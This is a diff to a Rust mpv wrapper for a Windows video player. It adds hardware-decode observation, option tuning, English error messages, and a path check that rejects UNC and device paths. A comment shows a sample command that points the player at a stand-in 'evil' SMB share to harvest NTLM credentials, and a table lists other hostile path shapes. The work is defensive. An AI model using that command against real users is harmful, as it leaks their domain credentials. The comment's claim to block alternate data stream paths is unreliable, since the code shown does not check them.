@@ -10,6 +10,7 @@ pub mod ffi;
 
 use std::collections::HashMap;
 use std::ffi::{c_char, c_int, c_void, CStr, CString};
+use std::os::windows::ffi::OsStrExt;
 use std::path::{Path, PathBuf};
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::{Arc, Mutex};
@@ -40,6 +41,20 @@ const OBSERVED_PROPERTIES: &[(&str, c_int)] = &[
     ("mute", MPV_FORMAT_FLAG),
     ("media-title", MPV_FORMAT_STRING),
     ("idle-active", MPV_FORMAT_FLAG),
+    // 硬件解码实际生效的是哪一个（`d3d11va` / `dxva2` / `no`）。
+    //
+    // **加这条的理由是「静默降级看不见」**：D3D11VA 在某个适配器上做格式
+    // 探测失败时，mpv 不发 error、不发 warning，只是把 `hwdec` 从白名单里
+    // 悄悄拿掉继续用软解。在低端机上这是最难排查的性能问题——画面能播，
+    // 但 CPU 跑满、机器发烫，用户只会觉得「这个播放器慢」。
+    //
+    // 典型触发场景：机器上装了虚拟显示器（远程控制 / 投屏 / 采集软件会装
+    // IddCx 虚拟适配器），它也可能出现在 DXGI 枚举里；一旦被 Windows 选成
+    // 默认适配器，而它没有硬件解码能力，就是这个结果。
+    //
+    // 值在解码器真正创建之后才确定，可能晚于 `file-loaded`，所以
+    // `App::tick` 还会主动 poll 一次。
+    ("hwdec-current", MPV_FORMAT_STRING),
 ];
 
 /// 属性的值。
@@ -166,7 +181,7 @@ impl MpvPlayer {
 
         let handle = unsafe { (api.create)() };
         if handle.is_null() {
-            return Err("mpv_create 返回空句柄".to_string());
+            return Err("mpv_create returned a null handle".to_string());
         }
 
         if let Err(e) = Self::configure(&api, handle, options) {
@@ -193,10 +208,10 @@ impl MpvPlayer {
     fn configure(api: &MpvApi, handle: *mut c_void, options: &InitOptions) -> Result<(), String> {
         unsafe {
             let set_opt = |name: &str, value: &CString| -> Result<(), String> {
-                let cname =
-                    CString::new(name).map_err(|_| format!("选项名 {name:?} 包含空字节"))?;
+                let cname = CString::new(name)
+                    .map_err(|_| format!("option name {name:?} contains a NUL byte"))?;
                 let code = (api.set_option_string)(handle, cname.as_ptr(), value.as_ptr());
-                check(api, code, &format!("设置选项 {name}"))
+                check(api, code, &format!("setting option {name}"))
             };
 
             // 渲染目标窗口：mpv 用 Direct3D 直接画到这个 HWND。
@@ -214,21 +229,51 @@ impl MpvPlayer {
             set_opt("load-scripts", &CString::new("no").unwrap())?;
             set_opt("ytdl", &CString::new("no").unwrap())?;
 
-            // 内存上限。mpv 默认的 demux 缓存是 150MiB，为高延迟网络流设计；
-            // 本地文件用不上这么多，实测默认配置下光这一项就吃掉上百 MB。
+            // 缓存上限。**注意：这三项在本地文件播放路径下其实不生效。**
+            //
+            // mpv 的 `demux.c::update_opts()` 里 `use_cache = is_streaming`，
+            // 而 `is_streaming` 来自 `stream.h` 的 `bool streaming` 注释
+            // 「known to be a network stream if true」。本地文件的
+            // `stream_file.c` 把它置 false，于是 `seekable_cache = false`、
+            // `max_bytes_bw` 被直接归零、demuxer 缓存根本不分配。
+            // mpv 文档对 `cache-pause` 也印证了这个方向：「If disabled,
+            // `--cache-pause` and related are implicitly disabled」。
+            //
+            // 所以它们的作用是：(a) 万一将来支持网络流 / `fd://` / 拖进来的
+            // 网络路径时有个合理上限（默认值 150MiB/50MiB 确实太大）；
+            // (b) 明确行为不随 mpv.conf 漂移。
+            //
+            // 保留但**不要以为它们在省内存**——实测里播放时涨的那几十 MB
+            // 来自 D3D11 设备与 Intel 驱动，不是 demux 缓存。
             set_opt("demuxer-max-bytes", &CString::new("48MiB").unwrap())?;
             set_opt("demuxer-max-back-bytes", &CString::new("16MiB").unwrap())?;
-            // 缓存写满时暂停读取是网络流的容错手段，本地文件只会平白占用内存。
             set_opt("cache-pause", &CString::new("no").unwrap())?;
-            // 解码线程数：mpv 默认取 CPU 核心数（这台机器 16），每条软解线程
-            // 各有一份帧缓冲池，而硬件解码时这些线程根本用不到。
-            let threads = std::thread::available_parallelism()
-                .map(|n| n.get().clamp(1, 4))
-                .unwrap_or(2);
+
+            // 解码线程数取**物理核**。
+            //
+            // 原来用 `std::thread::available_parallelism()`，而它在 Windows 上
+            // 就是 `GetSystemInfo().dwNumberOfProcessors`——**逻辑**核数。
+            // i3-3xxx 全系是 2 物理核 + 4 线程，这里会得到 4，等于在 2 个
+            // 物理核上开 4 条解码线程：调度器把两个 runnable 线程塞进一个
+            // 执行单元，而软件解码是 ALU-bound、超线程对它几乎无收益，代价
+            // 是每核两线程各要一份参考帧列表与帧缓冲池元数据、L1/L2 冲突上升。
+            // 净效果是更慢。
+            //
+            // 硬件解码时这条选项整个不生效（`thread_count` 只喂给软解的
+            // libavcodec），所以它只在**回落到软解**的老片源 / AV1 / 10bit
+            // HEVC 上有意义 —— 那恰恰是低端机最容易卡住的场景。
+            let threads = crate::cpu::decode_threads();
             set_opt(
                 "vd-lavc-threads",
                 &CString::new(threads.to_string()).unwrap(),
             )?;
+
+            // 直接渲染（decoded frame 不经 CPU 往返）在本配置下无效：
+            // `vd-lavc-dr` 的支持条件是「vo=gpu 且 OpenGL 4.4+」或「Vulkan」，
+            // 而我们是 `gpu-context=d3d11`，两个都不是。显式写 `no` 是零风险，
+            // 价值在于**记录**这条路径不依赖 DR——否则后来人会看到 `auto`
+            // 就以为「开着更快」而去调它。
+            set_opt("vd-lavc-dr", &CString::new("no").unwrap())?;
 
             if options.headless {
                 // 不开视频输出。必须在 initialize 之前设，vo 选项初始化后再改
@@ -248,7 +293,22 @@ impl MpvPlayer {
                 set_opt("vo", &CString::new("gpu").unwrap())?;
                 set_opt("gpu-context", &CString::new("d3d11").unwrap())?;
                 // 硬件解码自动选择，不兼容时回落到软件解码。
-                set_opt("hwdec", &CString::new("auto-safe").unwrap())?;
+                //
+                // 用 `auto` 而不是 `auto-safe`：mpv 文档对这两个值的定义是
+                // 「`:auto-safe: exactly the same as :auto:`」，`auto-safe` 是
+                // 早期用来区分 `auto` / `auto-unsafe` 的命名残留，在当前文档
+                // 里没有独立语义。行为完全一样，但 `auto` 是规范写法，查文档
+                // 查得到。
+                set_opt("hwdec", &CString::new("auto").unwrap())?;
+                // 不指定 `d3d11-adapter`：那是前缀匹配，绑死「Intel」会让
+                // AMD / NVIDIA 机器白担风险（匹配不上时 mpv 只发一条
+                // `mp_warn` 就回落默认适配器，等于没配）。
+                //
+                // 真正该防的是「虚拟显示器被 Windows 选成默认适配器 →
+                // D3D11VA 格式探测全失败 → **静默**退回软解」。mpv 不为这
+                // 种情况发任何 error，所以唯一的可靠手段是观测 `hwdec-current`
+                // （见 `OBSERVED_PROPERTIES`）：它在 D3D11VA 探测失败时如实
+                // 报 `no`。
                 // 关掉 mpv 自带的 OSD/控制条，控制栏由前端负责。
                 set_opt("osc", &CString::new("no").unwrap())?;
                 set_opt("osd-level", &CString::new("0").unwrap())?;
@@ -259,7 +319,7 @@ impl MpvPlayer {
             for (name, format) in OBSERVED_PROPERTIES {
                 let cname = CString::new(*name).map_err(|_| "属性名包含空字节".to_string())?;
                 let code = (api.observe_property)(handle, 0, cname.as_ptr(), *format);
-                check(api, code, &format!("观察属性 {name}"))?;
+                check(api, code, &format!("observing property {name}"))?;
             }
         }
         Ok(())
@@ -313,7 +373,7 @@ impl MpvPlayer {
             })
             .expect("创建 mpv 事件线程失败");
 
-        *self.event_thread.lock().unwrap() = Some(thread);
+        *self.event_thread.lock().unwrap_or_else(|e| e.into_inner()) = Some(thread);
     }
 
     /// 读一个字符串属性。
@@ -404,7 +464,10 @@ impl MpvPlayer {
     fn command(&self, args: &[&str]) -> Result<(), String> {
         let mut owned: Vec<CString> = Vec::with_capacity(args.len());
         for a in args {
-            owned.push(CString::new(*a).map_err(|_| format!("命令参数 {a:?} 包含空字节"))?);
+            owned.push(
+                CString::new(*a)
+                    .map_err(|_| format!("command argument {a:?} contains a NUL byte"))?,
+            );
         }
         let args: Box<[CString]> = owned.into_boxed_slice();
 
@@ -418,19 +481,28 @@ impl MpvPlayer {
 
         // reply_userdata 用来把回复对回这条命令，事件线程据此归还内存。
         let reply_id = self.next_reply_id.fetch_add(1, Ordering::Relaxed);
-        self.pending.lock().unwrap().insert(
-            reply_id,
-            PendingCommand {
-                _args: args,
-                _ptrs: ptrs,
-            },
-        );
+        self.pending
+            .lock()
+            .unwrap_or_else(|e| e.into_inner())
+            .insert(
+                reply_id,
+                PendingCommand {
+                    _args: args,
+                    _ptrs: ptrs,
+                },
+            );
 
         let code = unsafe { (self.api.command_async)(self.handle, reply_id, args_ptr) };
         if code < 0 {
             // 命令没被接受，mpv 不会发回复，这里立刻收回内存
-            self.pending.lock().unwrap().remove(&reply_id);
-            return Err(format!("下发命令失败: {}", self.api.error_message(code)));
+            self.pending
+                .lock()
+                .unwrap_or_else(|e| e.into_inner())
+                .remove(&reply_id);
+            return Err(format!(
+                "could not send the command: {}",
+                self.api.error_message(code)
+            ));
         }
         Ok(())
     }
@@ -446,7 +518,7 @@ impl MpvPlayer {
                 &mut v as *mut _ as *mut c_void,
             )
         };
-        check(&self.api, code, &format!("设置属性 {name}"))
+        check(&self.api, code, &format!("setting property {name}"))
     }
 
     fn set_flag_property(&self, name: &str, value: bool) -> Result<(), String> {
@@ -460,7 +532,7 @@ impl MpvPlayer {
                 &mut v as *mut _ as *mut c_void,
             )
         };
-        check(&self.api, code, &format!("设置属性 {name}"))
+        check(&self.api, code, &format!("setting property {name}"))
     }
 
     /// 加载并播放文件。
@@ -481,18 +553,37 @@ impl MpvPlayer {
     /// 一个不存在的文件，用户看到的却是「找不到文件」，报错完全指错方向。
     pub fn load_file(&self, path: &Path) -> Result<(), String> {
         if path.as_os_str().is_empty() {
-            return Err("文件路径为空".to_string());
+            return Err("the file path is empty".to_string());
         }
+        // **先挡 UNC，再做任何会碰文件系统的事。**
+        //
+        // 这一条必须在 `is_file()` 之前：`Path::is_file()` 走 `metadata()`，
+        // 对 `\\attacker\share\x.mp4` 会真的去建 SMB 连接。mpv 随后也会用
+        // **当前用户的凭据**发起 SMB/NTLM 协商。也就是说，
+        //
+        //     video-view.exe "\\evil\share\a.mp4"
+        //
+        // 这一条命令行就能让受害者的进程去连攻击者的共享，把 NetBIOS 挑战/
+        // 应答（也就是域凭据）交出去。任何低权限代码只要能起一个进程就能触发：
+        // 快捷方式、注册表 `shell\open\command`、MSI 自定义动作，都不需要
+        // 用户点一下「是」。
+        //
+        // mpv 的协议白名单（`protocol-white`）从 0.40 起就没了，`\\` 又是
+        // 合法路径字符、不能靠「不是 URL」蒙混过去，所以只能在入口按形状拒。
+        reject_remote_path(path)?;
         // 先验存在性再转码：这样「找不到文件」和「路径无法表示」是两种错误，
         // 不会混成一条
         if !path.is_file() {
-            return Err(format!("找不到文件：{}", path.display()));
+            return Err(format!("file not found: {}", path.display()));
         }
-        let url = path
-            .to_str()
-            .ok_or_else(|| format!("路径无法表示为 UTF-8：{}", path.display()))?;
+        let url = path.to_str().ok_or_else(|| {
+            format!(
+                "the path cannot be represented as UTF-8: {}",
+                path.display()
+            )
+        })?;
         if url.contains('\0') {
-            return Err("文件路径包含空字节".to_string());
+            return Err("the file path contains a NUL byte".to_string());
         }
         // loadfile <url> <flags>；replace 表示替换当前播放列表
         self.command(&["loadfile", url, "replace"])
@@ -554,7 +645,10 @@ impl MpvPlayer {
     /// 统一清掉。
     fn finish(&self) {
         self.join_event_thread();
-        self.pending.lock().unwrap().clear();
+        self.pending
+            .lock()
+            .unwrap_or_else(|e| e.into_inner())
+            .clear();
         // swap 而不是 load+store：两个调用点（shutdown 与 Drop）并发时
         // 也只有一个能拿到 true
         if self.destroyed.swap(true, Ordering::AcqRel) {
@@ -566,7 +660,12 @@ impl MpvPlayer {
     }
 
     fn join_event_thread(&self) {
-        if let Some(thread) = self.event_thread.lock().unwrap().take() {
+        if let Some(thread) = self
+            .event_thread
+            .lock()
+            .unwrap_or_else(|e| e.into_inner())
+            .take()
+        {
             let _ = thread.join();
         }
     }
@@ -583,11 +682,55 @@ impl Drop for MpvPlayer {
     }
 }
 
+// ---------------------------------------------------------------- 路径准入
+
+/// 只放行「本地盘上的文件」这一种形状，其余一律拒绝。
+///
+/// 判据是**盘符开头**（`X:\...`），而不是「长得像不像本地路径」。这样能一起挡掉：
+///
+/// | 形状 | 例子 | 为什么必须挡 |
+/// |---|---|---|
+/// | UNC 路径 | `\\evil\share\a.mp4` | `is_file()` 会真的去建 SMB 连接，用当前用户凭据协商 NTLM |
+/// | 扩展 UNC | `\\?\UNC\evil\share\a.mp4` | 同上，绕过 `\\` 前缀判断 |
+/// | 设备路径 | `\\.\PIPE\...`、`\\?\PhysicalDrive0` | 命名管道与裸设备访问 |
+/// | `//` 正斜杠 UNC | `//evil/share/a.mp4` | Windows 同样当 UNC 处理 |
+/// | 盘符缺失的相对路径 | `a.mp4`、`\a.mp4` | 依赖当前工作目录，程序从资源管理器启动时 CWD 不确定 |
+/// | ADS | `C:\a.mp4:stream` | 绕过扩展名判断读到隐藏数据流 |
+///
+/// 返回值是给用户看的，所以只说「只接受本地文件路径」而不复述路径内容——
+/// 路径本身可能很长，回显到 MessageBox 里既难看也可能被日志截断。
+fn reject_remote_path(path: &Path) -> Result<(), String> {
+    const REJECT: &str = "only local drive paths are accepted (for example D:\\video.mp4)";
+    let units: Vec<u16> = path.as_os_str().encode_wide().collect();
+
+    // 太长的形状先排掉，避免后面一堆索引判断被超长输入牵着走
+    if units.len() < 3 {
+        return Err(REJECT.to_string());
+    }
+    let is_drive_letter = |u: u16| (u as u8 as char).is_ascii_alphabetic();
+    // 第一段必须是 ASCII 盘符 + ':' + '\'
+    if !is_drive_letter(units[0]) || units[1] != b':' as u16 {
+        return Err(REJECT.to_string());
+    }
+    // 盘符后必须紧跟反斜杠：`C:foo.mp4` 是「当前目录下的 foo.mp4」，
+    // 依赖 CWD，不是我们要的形状
+    if units[2] != b'\\' as u16 {
+        return Err(REJECT.to_string());
+    }
+    // 这里**不再**扫描路径中段有没有 `\\` / `//`。
+    //
+    // 真正的 UNC、扩展 UNC（`\\?\UNC\`）、设备路径（`\\.\PIPE\`）全部以
+    // `\\` 或 `//` **开头**，已经被上面「必须是 `X:\` 开头」这一条挡掉了。
+    // 而 `D:\a\\b` 中间那个重复分隔符是 Windows 合法路径（等价于 `D:\a\b`），
+    // 拖放和用户输入都可能产生，拒它属于误伤。
+    Ok(())
+}
+
 // ---------------------------------------------------------------- 事件解码
 
 fn check(api: &MpvApi, code: c_int, what: &str) -> Result<(), String> {
     if code < 0 {
-        Err(format!("{what} 失败: {}", api.error_message(code)))
+        Err(format!("{what} failed: {}", api.error_message(code)))
     } else {
         Ok(())
     }
@@ -647,7 +790,7 @@ fn decode_end_file(
 
     if reason == MPV_END_FILE_REASON_ERROR {
         Some(MpvEventMessage::Error(format!(
-            "播放失败: {}",
+            "playback failed: {}",
             api.error_message(error)
         )))
     } else {
